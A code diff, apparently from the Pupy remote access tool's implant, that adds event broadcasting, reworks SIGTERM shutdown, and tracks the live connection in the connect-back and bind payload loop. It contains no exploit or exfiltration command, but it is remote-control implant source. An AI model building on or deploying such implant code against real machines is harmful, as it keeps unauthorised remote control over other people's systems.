@@ -143,6 +143,37 @@ if not sys.platform == 'win32' and not pupy.pseudo:
 
     ssl.SSLContext.set_default_verify_paths = set_default_verify_paths
 
+def defered_close_exit(connection):
+    try:
+        # Should be the custom event, as generated on client
+        broadcast_event(0x10000000 | 0xFFFF)
+    except Exception, e:
+        logger.exception(e)
+
+    logger.debug('Defered close+exit')
+
+    sys.terminated = True
+
+    if connection:
+        connection.close()
+
+def broadcast_event(eventid):
+    if pupy.connection:
+        logger.debug(
+            'Pupy connected: broadcast event via connection. EventId = %08x',
+            eventid)
+
+        pupy.connection.root.broadcast_event(eventid)
+
+    elif pupy.broadcast_event:
+        logger.debug(
+            'Pupy is not connected, but broadcast_event defined (%s). EventId = %08x',
+            pupy.broadcast_event, eventid)
+        pupy.broadcast_event(eventid)
+        logger.debug('Pupy connected: broadcast completed')
+    else:
+        logger.debug(
+            'No way to report event. EventId = %08x', eventid)
 
 def print_exception(tag=''):
     global debug
@@ -287,14 +318,17 @@ class PStore(object):
 class Task(threading.Thread):
 
     __slots__ = (
-        '_pstore', '_stopped', '_manager', '_dirty'
+        '_pstore', '_stopped', '_manager', '_dirty', '_event_id'
     )
 
     stopped = None
     results_type = list
+    event_id = None
 
     def __init__(self, manager, *args, **kwargs):
         threading.Thread.__init__(self)
+
+        self._event_id = kwargs.pop('event_id', self.event_id)
 
         self.daemon = True
         self._pstore = manager.pstore
@@ -330,7 +364,22 @@ class Task(threading.Thread):
             self._pstore[self].add(result)
         else:
             raise TypeError('Unknown results type: {}'.format(self.results_type))
+
+        fire_event = False
+
+        if not self._dirty:
+            fire_event = True
+
         self._dirty = True
+
+        try:
+            if fire_event and self._event_id is not None:
+                self.broadcast_event(self._event_id)
+        except:
+            print_exception('T/BE:{}'.format(self.name))
+
+    def broadcast_event(self, eventid):
+        broadcast_event(eventid)
 
     def stop(self):
         logger.debug('Stopping task %s', self.__class__.__name__)
@@ -472,12 +521,14 @@ def safe_obtain(proxy):
 
 setattr(pupy, 'manager', Manager(PStore()))
 setattr(pupy, 'Task', Task)
-setattr(pupy, 'connected', False)
+setattr(pupy, 'connection', None)
 setattr(pupy, 'obtain', safe_obtain) # I don't see a better spot to put this util
 setattr(pupy, 'creds_cache', {})
+setattr(pupy, 'broadcast_event', None)
+setattr(pupy, 'cid', None)
+
 setattr(sys, 'terminated', False)
 setattr(sys, 'terminate', None)
-setattr(pupy, 'cid', None)
 
 class UpdatableModuleNamespace(ModuleNamespace):
     __slots__ = ['__invalidate__']
@@ -687,18 +738,32 @@ def set_connect_back_host(HOST):
 def handle_sigchld(*args, **kwargs):
     os.waitpid(-1, os.WNOHANG)
 
-def handle_sighup(*args):
-    pass
+def handle_sighup(signal, frame):
+    logger.debug('SIGHUP')
 
-def handle_sigterm(*args):
-    try:
-        if hasattr(pupy, 'manager'):
-            pupy.manager.event(Manager.TERMINATE)
+def handle_sigterm(signal, frame):
+    logger.warning('SIGTERM')
 
-    except:
-        print_exception('[ST]')
+    manager = None
 
-    os._exit(0)
+    if hasattr(pupy, 'manager'):
+        manager = pupy.manager
+
+    if manager:
+        try:
+            manager.event(Manager.TERMINATE)
+        except Exception, e:
+            logger.exception(e)
+
+    if pupy.connection:
+        pupy.connection.defer(
+            logger.exception,
+            defered_close_exit,
+            pupy.connection)
+    else:
+        defered_close_exit(None)
+
+    logger.warning('SIGTERM HANDLED')
 
 attempt = 0
 
@@ -818,7 +883,7 @@ def main():
         launcher.parse_args(LAUNCHER_ARGS)
     except LauncherError as e:
         launcher.arg_parser.print_usage()
-        os._exit(1)
+        sys.exit(e)
 
     if pupy.pseudo:
         set_connect_back_host(launcher.get_host())
@@ -878,7 +943,6 @@ def rpyc_loop(launcher):
         logger.debug('Acquire launcher: %s', ret)
 
         try:
-            pupy.connected = False
             if isinstance(ret, tuple):  # bind payload
                 server_class, port, address, authenticator, stream, transport, transport_kwargs = ret
                 s = server_class(
@@ -893,11 +957,11 @@ def rpyc_loop(launcher):
                 )
 
                 sys.terminate = s.close
-                pupy.connected = True
+                pupy.connection = s
+
                 attempt = 0
                 s.start()
                 sys.terminate = None
-                pupy.connected = False
 
             else:  # connect payload
                 stream = ret
@@ -911,7 +975,7 @@ def rpyc_loop(launcher):
                 conn.init()
 
                 attempt = 0
-
+                pupy.connection = conn
                 conn.loop()
 
         except SystemExit:
@@ -925,6 +989,7 @@ def rpyc_loop(launcher):
 
         finally:
             logger.debug('Launcher completed')
+            pupy.connection = None
 
             if stream is not None:
                 try:
